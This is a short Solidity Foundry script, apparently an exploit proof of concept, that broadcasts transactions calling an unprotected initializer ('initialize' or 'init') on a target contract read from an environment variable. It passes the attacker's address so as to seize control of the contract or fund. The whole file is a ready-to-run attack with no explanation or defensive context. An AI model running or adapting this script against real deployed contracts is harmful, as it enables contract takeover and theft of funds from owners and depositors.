// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Script.sol";

contract RunInitializerPoC is Script {
    address target; address attacker; string fundName;
    function setUp() public { target = vm.envAddress("TARGET_ADDRESS"); attacker = vm.envOr("ATTACKER", msg.sender); fundName = vm.envOr("FUND_NAME", string("Fund")); }
    function run() public {
        vm.startBroadcast(attacker);
        (bool success,) = target.call(abi.encodeWithSignature("initialize(address)", attacker));
        if (!success) { (success,) = target.call(abi.encodeWithSignature("init(address,address,string)", attacker, attacker, fundName)); }
        if (success) { console.log("Initializer succeeded"); } else { console.log("Initializer failed"); }
        vm.stopBroadcast();
    }
}
